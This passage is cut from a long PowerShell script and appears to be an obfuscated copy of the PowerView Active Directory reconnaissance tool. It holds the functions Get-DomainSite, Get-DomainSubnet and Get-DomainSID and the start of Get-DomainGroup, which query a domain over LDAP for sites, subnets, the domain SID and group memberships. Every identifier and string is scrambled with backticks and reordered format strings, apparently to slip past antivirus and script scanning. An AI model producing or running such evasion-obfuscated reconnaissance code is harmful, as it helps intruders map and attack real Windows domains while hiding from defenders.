            ${IdEn`T`ITy} | &("{0}{2}{1}{3}" -f'Wher','bj','e-O','ect') {${_}} | &("{0}{2}{1}" -f 'For','ch-Object','Ea') {
                ${IDEN`TITYin`STA`Nce} = ${_}.("{1}{2}{0}"-f 'ace','R','epl').Invoke('(', '\28').("{0}{2}{1}"-f 'Rep','ce','la').Invoke(')', '\29')
                if (${IDeNtit`yINs`T`ANCe} -match ("{1}{0}" -f'*','^CN=.')) {
                    ${iD`eNTity`FiL`TER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pSboU`Ndp`ARame`TeRS}[("{2}{0}{1}"-f'ma','in','Do')]) -and (-not ${psbO`UNDP`AR`AMEt`eRs}[("{1}{2}{0}{3}"-f 'Bas','S','earch','e')])) {
                        
                        
                        ${i`DeNtiTYd`oMaiN} = ${IdeN`Tit`y`iN`s`TANCE}.("{1}{0}{2}"-f 'Strin','Sub','g').Invoke(${IDE`Ntit`yi`NSTance}.("{0}{1}{2}" -f'Ind','ex','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{1}{2}"-f 'Write-Ver','bos','e') ('['+'Get-D'+'omainSi'+'te]'+' '+'Extr'+'act'+'ed '+'dom'+'a'+'in '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${seA`RcHer`A`RGumEN`Ts}[("{1}{0}"-f'omain','D')] = ${ident`ITYD`OM`AIN}
                        ${SiTE`sEA`RcH`ER} = &("{2}{0}{1}{3}"-f 'mainSear','ch','Get-Do','er') @SearcherArguments
                        if (-not ${sI`TesEa`Rch`eR}) {
                            &("{1}{0}{2}" -f'-War','Write','ning') ('[Get'+'-D'+'o'+'mainS'+'it'+'e] '+'U'+'nable'+' '+'to'+' '+'r'+'e'+'t'+'rieve '+'do'+'main '+'searche'+'r'+' '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${gUID`B`yT`eST`RINg} = (-Join (([Guid]${id`EN`TITyinS`Ta`NcE}).("{1}{0}{2}{3}" -f'o','T','ByteAr','ray').Invoke() | &("{3}{1}{0}{2}"-f'c','a','h-Object','ForE') {${_}.("{1}{2}{0}" -f 'g','ToS','trin').Invoke('X').("{1}{0}" -f'eft','PadL').Invoke(2,'0')})) -Replace ("{0}{1}"-f'(','..)'),'\$1'
                        ${ident`ityf`I`lTER} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${ide`N`TITYFi`LT`ER} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${IdENt`I`TyFI`lter} -and (${IDenT`iTY`FIlt`eR}.("{1}{0}"-f'im','Tr').Invoke() -ne '') ) {
                ${F`I`LTER} += "(|$IdentityFilter)"
            }

            if (${PsBo`U`ND`pAra`mEt`ERs}[("{0}{2}{1}"-f 'GP','nk','Li')]) {
                &("{3}{0}{2}{1}" -f'rite','se','-Verbo','W') ('[G'+'et-Domain'+'Si'+'te] '+'S'+'e'+'arching '+'for'+' '+'s'+'it'+'es '+'with'+' '+"$GPLink "+'s'+'et '+'i'+'n '+'t'+'he '+'gp'+'Link '+'prop'+'er'+'ty')
                ${fil`TER} += "(gplink=*$GPLink*)"
            }

            if (${pSB`OU`N`dParAMET`eRS}[("{1}{2}{0}" -f'r','LD','APFilte')]) {
                &("{0}{3}{4}{1}{2}" -f'Write','os','e','-Ve','rb') ('[Get-D'+'omai'+'nSit'+'e] '+'U'+'sing '+'addi'+'tio'+'na'+'l '+'LD'+'AP '+'fil'+'ter: '+"$LDAPFilter")
                ${fi`l`Ter} += "$LDAPFilter"
            }

            ${S`itE`seaR`CHER}."FiLT`Er" = "(&(objectCategory=site)$Filter)"
            &("{0}{1}{2}" -f'W','rite-V','erbose') "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if (${psB`Ou`NdP`AraMEtE`RS}[("{0}{1}{2}" -f'F','indO','ne')]) { ${Re`sUL`Ts} = ${sITEseaR`C`HEr}.("{0}{1}"-f 'Fin','dAll').Invoke() }
            else { ${R`eSul`TS} = ${sItESE`A`RCH`eR}.("{2}{0}{1}" -f'd','All','Fin').Invoke() }
            ${R`Es`UlTs} | &("{1}{2}{0}" -f'bject','Where','-O') {${_}} | &("{2}{4}{0}{3}{1}" -f'Each-Ob','ct','Fo','je','r') {
                if (${p`SBouN`DpAR`AMeTE`Rs}['Raw']) {
                    
                    ${s`ITe} = ${_}
                }
                else {
                    ${S`ITE} = &("{3}{0}{1}{5}{4}{2}" -f 'nv','er','erty','Co','LDAPProp','t-') -Properties ${_}."p`RopERt`iES"
                }
                ${S`iTe}."p`SObjeCT"."Type`Nam`ES".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{1}{0}{2}{4}{3}" -f'we','Po','rVie','te','w.Si'))
                ${s`itE}
            }
            if (${reSu`L`Ts}) {
                try { ${R`ESu`lTS}.("{1}{0}" -f 'e','dispos').Invoke() }
                catch {
                    &("{1}{0}{2}{3}" -f'rite-Verb','W','o','se') ("{4}{13}{6}{0}{11}{7}{2}{15}{1}{5}{9}{10}{3}{12}{8}{14}"-f'a',' ','e] Error ','esu','[','t','et-Dom','t','ts ','he ','R','inSi','l','G','object','disposing of')
                }
            }
            ${SIt`eS`EAR`C`heR}.("{2}{1}{0}"-f'ose','isp','d').Invoke()
        }
    }
}


function gET`-d`omAInS`U`BNeT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}"-f 'cess','PS','ShouldP','ro'}, '')]
    [OutputType({"{3}{4}{1}{2}{0}"-f'et','er','View.Subn','Po','w'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOsiTioN = 0, VaLuefroMPipeLInE = ${TR`Ue}, VALuefROmpipElinEBYpropeRtYnAmE = ${TR`UE})]
        [Alias({"{1}{0}"-f 'e','Nam'})]
        [String[]]
        ${I`dE`NTiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SI`TE`NamE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'Filt','r','e'})]
        [String]
        ${L`DaP`FILtER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRoPE`RTi`es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'h','ADSPat'})]
        [String]
        ${s`EArC`hbasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{4}{1}" -f't','r','nCon','Domai','rolle'})]
        [String]
        ${s`e`RVEr},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{2}{0}{1}"-f 'v','el','OneLe'}, {"{0}{1}" -f 'Subt','ree'})]
        [String]
        ${sE`A`Rchsc`OPE} = ("{0}{2}{1}" -f'S','tree','ub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rES`UlTp`Ag`ESiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`Erve`RTIMELIm`It},

        [ValidateSet({"{1}{0}" -f'l','Dac'}, {"{0}{1}"-f'Grou','p'}, {"{0}{1}" -f 'N','one'}, {"{0}{1}" -f'Own','er'}, {"{0}{1}" -f'Sac','l'})]
        [String]
        ${sEcuR`ITyMA`S`kS},

        [Switch]
        ${t`OMb`sToNe},

        [Alias({"{2}{0}{3}{1}" -f'urn','e','Ret','On'})]
        [Switch]
        ${Fi`NdoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eDen`TI`AL} =   (  varIabLE  ("2"+"1Gv7e")).VALUe::"em`PtY",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${s`eaR`Ch`eRarGu`mENts} = @{
            ("{4}{2}{1}{0}{3}"-f'efi','ePr','s','x','SearchBa') = ("{1}{5}{7}{0}{2}{3}{6}{4}"-f 'ites,CN=','CN=S','Con','fig','tion','ubne','ura','ts,CN=S')
        }
        if (${pSBOUNDpAR`A`mET`ERS}[("{1}{0}"-f 'omain','D')]) { ${SE`ARcH`erArGumen`TS}[("{0}{2}{1}" -f'Do','in','ma')] = ${D`omain} }
        if (${pSBOu`NDp`A`RaM`ETerS}[("{3}{1}{2}{0}" -f 'erties','r','op','P')]) { ${SEa`RCH`e`RARg`UmENTs}[("{1}{0}{2}"-f 'r','P','operties')] = ${Pr`OpERT`IEs} }
        if (${P`sbOuNdPaRa`met`ers}[("{0}{1}{2}"-f'Sear','chBas','e')]) { ${s`Earch`ERaRGu`mEnTS}[("{0}{2}{1}"-f 'Se','e','archBas')] = ${S`eARChB`AsE} }
        if (${ps`B`ouNDPaR`A`M`ETers}[("{0}{1}"-f 'Serve','r')]) { ${Sea`R`ChERarG`UMENTs}[("{1}{0}" -f 'er','Serv')] = ${s`eR`VeR} }
        if (${pS`BoUndp`AraM`E`TERs}[("{2}{0}{1}{3}" -f'ea','rchScop','S','e')]) { ${S`EA`RCHErArGUm`ENTs}[("{0}{2}{1}{3}"-f'Se','c','ar','hScope')] = ${sEar`CH`SC`ope} }
        if (${Ps`BoUNDPar`A`mETerS}[("{1}{0}{2}{3}{4}" -f 'ltP','Resu','age','Si','ze')]) { ${Se`A`RcHE`R`ARgu`meNTS}[("{0}{1}{2}" -f 'ResultPage','S','ize')] = ${resUlT`PagE`s`iZE} }
        if (${pSBO`U`NdpARA`METErs}[("{0}{2}{3}{1}" -f 'Se','mit','r','verTimeLi')]) { ${s`EaRcHErar`Gum`eNTS}[("{1}{3}{2}{0}" -f't','ServerTi','eLimi','m')] = ${Se`RV`Er`TiMElimiT} }
        if (${P`sBOUnD`pArAm`e`TErS}[("{1}{2}{3}{0}" -f 'ks','Se','curi','tyMas')]) { ${s`earCheRAR`gum`ents}[("{3}{0}{2}{1}" -f'rityM','s','ask','Secu')] = ${se`CuRItY`M`AS`KS} }
        if (${PsB`Oun`d`pArAmetERs}[("{1}{0}" -f'e','Tombston')]) { ${S`earCH`E`RaRGumeNTS}[("{1}{0}" -f'mbstone','To')] = ${T`omB`sTonE} }
        if (${PsBO`UNdp`AraM`ete`Rs}[("{1}{0}{2}" -f'ede','Cr','ntial')]) { ${S`EARCH`ER`Ar`guME`Nts}[("{1}{0}{3}{2}" -f'r','C','ential','ed')] = ${C`RE`D`enTIAL} }
        ${S`UbN`ETSe`ArcheR} = &("{3}{1}{0}{5}{4}{2}"-f 'nS','i','r','Get-Doma','arche','e') @SearcherArguments
    }

    PROCESS {
        if (${Su`B`N`eTSea`RchER}) {
            ${i`DeN`TI`TYFiLT`er} = ''
            ${FI`l`TER} = ''
            ${I`dEnti`Ty} | &("{1}{2}{3}{0}"-f'ct','W','here-O','bje') {${_}} | &("{1}{0}{2}{3}{4}"-f'ach-','ForE','O','bje','ct') {
                ${IDe`N`TITYiNstaN`cE} = ${_}.("{1}{2}{0}" -f 'e','Repl','ac').Invoke('(', '\28').("{1}{0}"-f'place','Re').Invoke(')', '\29')
                if (${i`DEnT`It`YINsta`Nce} -match ("{1}{0}" -f'CN=.*','^')) {
                    ${i`Dent`I`Ty`FIlter} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PsbO`UnDPAraME`T`erS}[("{1}{0}" -f 'ain','Dom')]) -and (-not ${psbOU`N`dp`ArA`MeTers}[("{1}{0}{2}"-f 'archBa','Se','se')])) {
                        
                        
                        ${i`DE`N`TITYdoMaiN} = ${i`DeN`TI`TyINStaNCE}.("{1}{0}"-f 'String','Sub').Invoke(${iDent`ityInsT`A`N`cE}.("{2}{1}{0}"-f'Of','x','Inde').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{3}{1}{0}"-f'rbose','te-Ve','Wr','i') ('[Get-D'+'omainSu'+'bnet'+'] '+'Extr'+'ac'+'ted '+'do'+'mai'+'n '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${SEArc`heraR`gU`m`enTs}[("{0}{1}" -f'Domai','n')] = ${iDEN`Ti`TYDOm`AiN}
                        ${subnetsE`Arc`hEr} = &("{2}{4}{5}{0}{1}{3}" -f'ar','c','Get-Do','her','m','ainSe') @SearcherArguments
                        if (-not ${suBNet`SE`Arc`heR}) {
                            &("{0}{1}{2}" -f'W','rite-Wa','rning') ('[Get-'+'DomainSu'+'bn'+'e'+'t'+'] '+'Unab'+'le '+'t'+'o '+'r'+'etrieve '+'doma'+'i'+'n '+'searche'+'r '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${GuIdB`Yte`ST`Ri`Ng} = (-Join (([Guid]${iDE`Nt`iTYiNS`Tan`Ce}).("{3}{2}{0}{1}" -f'y','teArray','B','To').Invoke() | &("{0}{1}{2}" -f'ForE','ach-O','bject') {${_}.("{2}{1}{0}" -f'g','in','ToStr').Invoke('X').("{0}{1}"-f'Pa','dLeft').Invoke(2,'0')})) -Replace ("{0}{1}" -f'(','..)'),'\$1'
                        ${iDen`TitYF`iLt`ER} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${IdE`Nti`TYFIlt`er} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${Iden`T`ITYfilTEr} -and (${I`dEn`T`ItyF`IlTEr}.("{0}{1}"-f'T','rim').Invoke() -ne '') ) {
                ${fi`L`TER} += "(|$IdentityFilter)"
            }

            if (${ps`B`oU`N`dPAraMETERs}[("{0}{1}{2}" -f'LD','AP','Filter')]) {
                &("{1}{2}{3}{0}"-f'e','Wr','ite-V','erbos') ('[G'+'et-'+'DomainSu'+'b'+'net] '+'Using'+' '+'additi'+'ona'+'l '+'LD'+'AP '+'f'+'ilte'+'r: '+"$LDAPFilter")
                ${f`IlTER} += "$LDAPFilter"
            }

            ${s`UBN`eTsEARcH`ER}."F`ILTEr" = "(&(objectCategory=subnet)$Filter)"
            &("{0}{2}{1}{3}" -f'Wr','erbos','ite-V','e') "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if (${pS`Bou`NdparaME`TERs}[("{0}{1}" -f 'FindOn','e')]) { ${rE`su`LtS} = ${sUb`NETS`earcher}.("{0}{2}{1}"-f 'F','ndOne','i').Invoke() }
            else { ${Re`suLTS} = ${S`U`BNetseArCher}.("{0}{1}" -f'FindA','ll').Invoke() }
            ${r`e`SulTS} | &("{1}{0}{2}" -f'here-Obje','W','ct') {${_}} | &("{3}{1}{0}{2}" -f 'ch-Obje','a','ct','ForE') {
                if (${pSBOUN`DPA`R`AM`eTErs}['Raw']) {
                    
                    ${sU`B`Net} = ${_}
                }
                else {
                    ${SUb`N`ET} = &("{5}{0}{3}{4}{1}{2}" -f'ert-LDAP','e','rty','P','rop','Conv') -Properties ${_}."p`ROPe`RTIES"
                }
                ${SUb`N`Et}."PsobJ`E`ct"."tYp`ena`Mes".("{2}{0}{1}" -f 'ns','ert','I').Invoke(0, ("{3}{1}{4}{0}{2}"-f'b','ew.S','net','PowerVi','u'))

                if (${psB`ounD`ParAMet`ERs}[("{1}{0}" -f'Name','Site')]) {
                    
                    
                    if (${S`UbN`eT}."prO`Pe`RTIES" -and (${s`Ub`NET}."PROPE`Rti`ES"."SitEoBj`e`ct" -like "*$SiteName*")) {
                        ${S`UBnet}
                    }
                    elseif (${s`UBnEt}."Si`T`EOBJECT" -like "*$SiteName*") {
                        ${Sub`N`ET}
                    }
                }
                else {
                    ${s`Ub`Net}
                }
            }
            if (${r`e`suLTs}) {
                try { ${RE`sU`LTs}.("{1}{0}"-f 'pose','dis').Invoke() }
                catch {
                    &("{1}{2}{0}" -f'erbose','Write','-V') ('[Get'+'-Dom'+'ai'+'n'+'Subn'+'et]'+' '+'Er'+'ror '+'d'+'ispo'+'sing '+'of'+' '+'t'+'he '+'Resu'+'l'+'ts '+'object'+': '+"$_")
                }
            }
            ${SUBN`etsE`ArC`H`eR}.("{0}{2}{1}" -f'd','pose','is').Invoke()
        }
    }
}


function g`ET-DOm`A`I`Nsid {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}"-f 's','P','SSho','uldProces'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${doM`A`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}" -f 'DomainC','er','on','troll'})]
        [String]
        ${S`eRV`eR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreD`Ent`IAL} =   ( VarIABLe  ('21GV7'+'E')).vAlUe::"EmP`TY"
    )

    ${seArCh`ERaR`g`U`MEnTs} = @{
        ("{2}{1}{0}" -f 'r','DAPFilte','L') = (("{7}{6}{1}{5}{3}{4}{2}{0}" -f'=8192)','rAccount',':','840.113556.1.4.80','3','Control:1.2.','e','(us'))
    }
    if (${Psb`o`UND`P`ARAMEte`Rs}[("{1}{0}"-f 'omain','D')]) { ${SeARc`hE`R`ARgU`Men`Ts}[("{0}{2}{1}" -f'Dom','n','ai')] = ${D`OM`AiN} }
    if (${p`S`B`OUNDP`AramEteRs}[("{1}{0}" -f'ver','Ser')]) { ${sea`RChEra`RGU`m`ENts}[("{2}{1}{0}" -f 'r','rve','Se')] = ${SEr`V`eR} }
    if (${PsBOuN`dpa`RaM`eterS}[("{0}{2}{1}" -f 'Cre','tial','den')]) { ${seARc`he`RaR`gumENts}[("{0}{2}{1}"-f 'Cred','al','enti')] = ${C`REdEn`T`IAl} }

    ${DCs`iD} = &("{1}{3}{2}{0}"-f'omputer','Get-Dom','nC','ai') @SearcherArguments -FindOne | &("{3}{1}{2}{4}{0}" -f't','l','e','Se','ct-Objec') -First 1 -ExpandProperty ("{3}{1}{0}{2}" -f'ects','bj','id','o')

    if (${d`CsID}) {
        ${Dc`siD}.("{1}{0}{2}" -f'St','Sub','ring').Invoke(0, ${DC`sid}.("{2}{1}{0}" -f 'Of','Index','Last').Invoke('-'))
    }
    else {
        &("{1}{2}{0}{3}"-f'erb','Writ','e-V','ose') ('[Get'+'-Doma'+'i'+'n'+'S'+'ID] '+'E'+'rror'+' '+'ex'+'trac'+'ting '+'domai'+'n '+'SI'+'D '+'fo'+'r '+"'$Domain'")
    }
}


function ge`T-`Do`maIn`gRoUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{4}{0}"-f 'ss','PSSh','oul','dP','roce'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{9}{3}{5}{7}{4}{8}{0}{1}{6}"-f'reTh','anA','P','Declare','arsM','d','ssignments','V','o','SUse'}, '')]
    [OutputType({"{4}{2}{3}{0}{1}" -f'Gr','oup','owerVi','ew.','P'})]
    [CmdletBinding(defaUltpARAMETERSETNAMe = {"{0}{1}{2}{3}"-f 'AllowD','e','legatio','n'})]
    Param(
        [Parameter(POsition = 0, ValueFrOMPIpELINe = ${Tr`Ue}, vALueFrOmPiPelIneBYPRoPErTynamE = ${TR`UE})]
        [Alias({"{0}{2}{3}{4}{1}" -f'Dis','dName','ting','u','ishe'}, {"{2}{0}{1}" -f 'cco','untName','SamA'}, {"{1}{0}" -f 'ame','N'}, {"{3}{5}{1}{4}{0}{2}"-f 'ist','e','inguishedName','M','rD','emb'}, {"{1}{0}{2}" -f'berN','Mem','ame'})]
        [String[]]
        ${id`En`Ti`Ty},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'me','erNa','Us'})]
        [String]
        ${m`EMBERID`E`NTITy},

        [Switch]
        ${A`DmIncOu`Nt},

        [ValidateSet({"{1}{0}{2}" -f 'Loca','Domain','l'}, {"{0}{3}{2}{1}"-f 'NotDo','ocal','ainL','m'}, {"{1}{0}{2}"-f'a','Glob','l'}, {"{3}{1}{0}{2}" -f'l','otG','obal','N'}, {"{0}{2}{1}" -f 'Un','l','iversa'}, {"{0}{1}{3}{2}"-f'Not','U','sal','niver'})]
        [Alias({"{1}{0}" -f 'pe','Sco'})]
        [String]
        ${gRo`U`ps`coPe},

        [ValidateSet({"{1}{0}{2}"-f'e','S','curity'}, {"{3}{0}{2}{1}"-f'i','ibution','str','D'}, {"{2}{4}{1}{3}{0}"-f 'ystem','ate','C','dByS','re'}, {"{0}{4}{1}{3}{2}" -f'No','a','ystem','tedByS','tCre'})]
        [String]
        ${Gro`UpP`RoP`ER`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`mAin},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'lter','Fi'})]
        [String]
        ${lDA`PFiLt`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${propErt`I`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'h','SPat','AD'})]
        [String]
        ${sEarcH`Ba`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}" -f 'oma','ontroller','D','inC'})]
        [String]
        ${S`ER`VEr},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{1}{0}"-f 'l','OneLeve'}, {"{1}{0}" -f'tree','Sub'})]
        [String]
        ${SE`ARc`hsCO`PE} = ("{0}{2}{1}" -f 'S','ree','ubt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`S`UltP`AGesI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERvE`Rt`I`MElimiT},

        [ValidateSet({"{1}{0}" -f 'acl','D'}, {"{0}{1}" -f'Gr','oup'}, {"{0}{1}" -f 'Non','e'}, {"{1}{0}" -f 'wner','O'}, {"{0}{1}"-f 'S','acl'})]
        [String]
        ${SecuRi`TY`M`As`Ks},

        [Switch]
        ${TOM`Bs`TONE},

        [Alias({"{1}{0}{2}"-f'eturnOn','R','e'})]
        [Switch]
        ${FI`NDone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creDE`Nt`iAL} =  (  gET-vARiable 21gv7E  ).vALue::"EM`pty",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${s`eArchERA`Rg`U`Men`TS} = @{}
        if (${PsbOuNDP`A`RA`MEtE`RS}[("{0}{1}{2}" -f'Do','mai','n')]) { ${SE`A`RchEra`RG`UME`NtS}[("{0}{1}"-f'D','omain')] = ${d`OmaiN} }
        if (${Psbo`UNdPA`R`AME`TeRS}[("{0}{1}{2}" -f'Proper','ti','es')]) { ${s`E`ARCHer`ArgUMents}[("{0}{1}{3}{2}"-f'P','r','perties','o')] = ${pRopeRT`I`Es} }
        if (${PS`BoUn`Dpara`me`T`erS}[("{2}{1}{0}"-f 'archBase','e','S')]) { ${SeaRC`heRaR`gUm`EnTs}[("{0}{2}{1}"-f 'Sear','ase','chB')] = ${se`ARcH`BAse} }
        if (${psB`OUNDPa`R`AME`Te`RS}[("{0}{1}"-f 'S','erver')]) { ${SEArc`h`eR`Argume`Nts}[("{2}{0}{1}" -f 'e','rver','S')] = ${Se`RVER} }
        if (${PS`B`OuND`pA`RAmETERS}[("{1}{2}{0}"-f 'ope','Sear','chSc')]) { ${sEa`RC`H`erArGumENtS}[("{2}{0}{3}{1}" -f 'a','chScope','Se','r')] = ${seAR`CH`scOpe} }
        if (${PS`BoU`N`DParametE`RS}[("{3}{1}{0}{2}" -f'tPageS','ul','ize','Res')]) { ${seA`RC`HE`RaRG`UMeNTS}[("{3}{2}{1}{0}{4}"-f 'S','e','tPag','Resul','ize')] = ${REs`ULTpa`ge`SiZe} }
        if (${pS`BOUNdpAR`A`M`Ete`Rs}[("{3}{1}{0}{2}{4}" -f 'eLim','im','i','ServerT','t')]) { ${se`ARCheRA`RgumEn`Ts}[("{1}{0}{3}{2}" -f'erT','Serv','it','imeLim')] = ${s`ERVeR`Ti`MEl`imIT} }
        if (${psbo`U`NdpA`Ra`ME`TErS}[("{2}{1}{0}" -f'sks','a','SecurityM')]) { ${Sea`R`CHe`Ra`RGU`MenTS}[("{2}{3}{0}{1}" -f 'rityMa','sks','Se','cu')] = ${SeCu`RiT`YmAsKS} }
        if (${Psb`OUN`dpA`Ra`mE`TErS}[("{1}{2}{0}" -f'tone','Tomb','s')]) { ${SEA`RCh`Er`AR`Gume`NTs}[("{0}{1}{2}" -f'Tomb','sto','ne')] = ${t`o`mBsToNE} }
        if (${PSboun`D`pAR`AMeteRs}[("{2}{0}{3}{1}" -f'red','ial','C','ent')]) { ${SeAR`C`hE`R`ARGUmENts}[("{2}{1}{0}" -f 'ntial','de','Cre')] = ${CreDenT`I`Al} }
        ${G`Roups`eaRCher} = &("{0}{1}{3}{4}{2}"-f'Get-Domain','S','r','ea','rche') @SearcherArguments
    }

    PROCESS {
        if (${g`Ro`U`PsEar`Cher}) {
            if (${PSBoU`NDP`ArAMe`TERS}[("{0}{3}{1}{2}"-f'Member','ent','ity','Id')]) {

                if (${sE`A`RcHE`RaRgumeN`TS}[("{1}{0}{2}" -f'rop','P','erties')]) {
                    ${OL`DPrOPErTI`Es} = ${seaRcHErA`R`G`U`mENts}[("{0}{2}{1}" -f'Propert','s','ie')]
                }

                ${s`EaR`cHEr`ARgUm`enTS}[("{0}{1}{2}" -f'Ide','ntit','y')] = ${M`em`BErIDEn`TI`Ty}
                ${SearCHERAR`G`U`ME`Nts}['Raw'] = ${t`Rue}

                &("{0}{3}{2}{1}{4}" -f 'Get-','i','ma','Do','nObject') @SearcherArguments | &("{2}{3}{0}{1}" -f'ch-Obj','ect','ForE','a') {
                    
                    ${OB`J`ectDIr`eCT`oryE`NtrY} = ${_}.("{4}{2}{0}{1}{3}" -f'rec','tor','etDi','yEntry','G').Invoke()

                    
                    ${OBJEcT`d`iRec`TorYE`NTrY}.("{3}{0}{1}{2}"-f'r','esh','Cache','Ref').Invoke(("{0}{2}{1}"-f'tokenGr','ps','ou'))

                    ${O`Bje`ctDiR`E`ct`OryeNt`RY}."TO`KenG`ROuPs" | &("{2}{1}{4}{3}{0}" -f 'h-Object','o','F','Eac','r') {
                        
                        ${GROU`Ps`iD} = (&("{2}{1}{0}{3}"-f'bje','w-O','Ne','ct') ("{0}{6}{1}{5}{7}{2}{4}{3}"-f'Sys','m.Security.','I','ier','dentif','Principal.Secur','te','ity')(${_},0))."Va`lUe"

                        
                        if (${GrOU`P`SID} -notmatch ("{3}{1}{0}{2}"-f'5-3','1-','2-.*','^S-')) {
                            ${sEar`cHERArGU`Me`NTs}[("{1}{2}{0}" -f'entity','I','d')] = ${G`R`Ou`PSid}
                            ${S`E`ARCheRArgUM`ents}['Raw'] = ${F`AlsE}
                            if (${oLdp`ROpe`R`TiES}) { ${s`EArC`h`erArgUM`ENTS}[("{0}{1}{2}" -f 'Proper','ti','es')] = ${oLDprO`p`Ert`IES} }
                            ${gR`OUp} = &("{0}{2}{4}{3}{1}"-f 'Get-','ct','D','bje','omainO') @SearcherArguments
                            if (${G`Ro`UP}) {
                                ${Gr`oup}."Ps`oBJ`Ect"."typE`Nam`es".("{0}{2}{1}"-f'Ins','rt','e').Invoke(0, ("{2}{1}{0}{3}"-f'Grou','.','PowerView','p'))
                                ${GRo`Up}
                            }
                        }
                    }
                }
            }
            else {
                ${idE`NT`iTyF`IlT`er} = ''
                ${fil`TER} = ''
                ${ID`eN`TitY} | &("{3}{1}{0}{2}" -f'c','e-Obje','t','Wher') {${_}} | &("{1}{0}{2}{3}{4}" -f 'E','For','a','ch-Ob','ject') {
                    ${Id`EnT`ITYINsTAN`cE} = ${_}.("{2}{0}{1}" -f'ep','lace','R').Invoke('(', '\28').("{0}{1}{2}" -f 'Rep','la','ce').Invoke(')', '\29')
                    if (${iD`ENTIt`yiNs`TAnCe} -match ("{1}{0}"-f '1-','^S-')) {
                        ${idenTiT`YF`I`lT`ER} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${IdeNTit`Y`iNs`TanCe} -match ("{1}{0}"-f'CN=','^')) {
                        ${I`DEnTItyfIl`T`er} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${PS`BOuNdp`ArA`m`eTE`RS}[("{2}{1}{0}" -f'in','oma','D')]) -and (-not ${PsboU`NdpAr`A`mEt`erS}[("{1}{0}{2}"-f's','SearchBa','e')])) {
                            
                            
                            ${iDENTIty`D`Om`Ain} = ${IDE`Nt`iT`YInStanCE}.("{1}{0}{2}{3}"-f'u','S','bSt','ring').Invoke(${I`DE`NtiTy`i`Ns`TaNcE}.("{1}{0}" -f 'exOf','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{1}{0}{3}{2}" -f '-Ve','Write','ose','rb') ('[Get-Do'+'mai'+'n'+'Group'+']'+' '+'Ext'+'ra'+'cted '+'dom'+'ain '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${SE`ARC`heRar`G`UmEN`TS}[("{0}{1}" -f 'Dom','ain')] = ${Id`EntitYD`om`A`IN}
                            ${GrOuPS`EA`RcH`eR} = &("{0}{3}{2}{1}"-f'Get-Doma','archer','nSe','i') @SearcherArguments
                            if (-not ${gR`o`U`PSeArchER}) {
                                &("{1}{2}{3}{0}" -f'Warning','W','ri','te-') ('[G'+'et'+'-Do'+'mainGroup]'+' '+'Unabl'+'e'+' '+'t'+'o '+'ret'+'rieve'+' '+'domain'+' '+'searc'+'he'+'r '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${I`den`TItY`i`NSTaN`Ce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${GuI`d`BY`TEstriNG} = (([Guid]${iDe`NtitYIn`s`TAnCE}).("{0}{2}{3}{1}" -f'T','eArray','o','Byt').Invoke() | &("{2}{1}{0}" -f 't','c','ForEach-Obje') { '\' + ${_}.("{1}{2}{0}"-f 'ng','ToStr','i').Invoke('X2') }) -join ''
                        ${Ide`NtI`Tyfi`LtEr} += "(objectguid=$GuidByteString)"
                    }
